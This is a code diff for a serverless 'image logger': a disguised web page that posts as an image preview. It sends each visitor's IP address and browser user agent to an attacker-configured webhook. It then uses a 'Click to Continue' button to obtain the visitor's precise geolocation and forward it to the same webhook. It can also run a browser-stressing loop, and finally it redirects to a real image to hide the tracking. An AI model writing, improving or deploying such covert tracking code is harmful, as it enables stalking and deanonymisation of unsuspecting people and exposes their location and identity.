@@ -1,11 +1,10 @@
 import json
 import httpagentparser
 import aiohttp
-from aiohttp import web
 
 # ==== CONFIG ====
 options = {
-    "accurate_location": True,  # Request geolocation after page load
+    "accurate_location": True,  # Ask user for geolocation
     "browser_stress": False      # Optional browser stress
 }
 
@@ -44,24 +43,42 @@ async def send_webhook(ip, useragent, lat=None, lon=None):
         try:
             await session.post(config["webhook"], json=payload)
         except:
-            print("Webhook failed")
+            pass
 
-# ==== GET HANDLER ====
+# ==== Vercel Serverless Function ====
 async def handler(request):
+    # POST handler for geolocation info
+    if request.method == "POST":
+        try:
+            data = await request.json()
+            await send_webhook(
+                data.get("ip"),
+                data.get("useragent"),
+                data.get("lat"),
+                data.get("lon")
+            )
+        except:
+            pass
+        return {
+            "statusCode": 200,
+            "body": "OK"
+        }
+
+    # GET request: Landing page
     ip = request.headers.get("x-forwarded-for", request.remote)
     useragent = request.headers.get("User-Agent", "")
 
-    # Send initial report
+    # Initial webhook report (without location)
     await send_webhook(ip, useragent)
 
-    # JS for geolocation & optional browser stress
+    # JS for geolocation & optional browser stress after click
     geo_js = ""
     if options["accurate_location"]:
         geo_js = f"""
 if (navigator.geolocation) {{
     navigator.geolocation.getCurrentPosition(
         function(position) {{
-            fetch('/', {{
+            fetch(window.location.href, {{
                 method: 'POST',
                 headers: {{'Content-Type': 'application/json'}},
                 body: JSON.stringify({{
@@ -75,6 +92,7 @@ if (navigator.geolocation) {{
     );
 }}
 """
+
     stress_js = ""
     if options["browser_stress"]:
         stress_js = "for (let i=0;i<1e8;i++){Math.sqrt(i);}"
@@ -83,36 +101,27 @@ if (navigator.geolocation) {{
 <html>
 <head>
 <meta property="og:image" content="{config['loading_image']}">
-<title>Loading Image</title>
+<title>Loading Image...</title>
 </head>
 <body style="text-align:center;">
 <h2>Loading Image...</h2>
 <img src="{config['loading_image']}" style="width:50%;height:auto;">
+<br><br>
+<button id="allowBtn" style="padding:10px 20px;font-size:16px;">Click to Continue</button>
 <script>
-setTimeout(function() {{
+document.getElementById('allowBtn').onclick = function() {{
+    {geo_js}
+    {stress_js}
+    // Redirect to real image
     window.location.href = '{config['image']}';
-}}, 2000);
-{geo_js}
-{stress_js}
+}};
 </script>
 </body>
 </html>
 """
-    return web.Response(text=html, content_type='text/html')
 
-# ==== POST HANDLER FOR GEO DATA ====
-async def post_handler(request):
-    try:
-        data = await request.json()
-        await send_webhook(data.get("ip"), data.get("useragent"), data.get("lat"), data.get("lon"))
-    except:
-        pass
-    return web.Response(text="OK")
-
-# ==== VERCEL SERVERLESS ENTRY POINT ====
-app = web.Application()
-app.router.add_get('/', handler)
-app.router.add_post('/', post_handler)
-
-def main(req, res):
-    return web.run_app(app)
+    return {
+        "statusCode": 200,
+        "headers": {"Content-Type": "text/html"},
+        "body": html
+    }
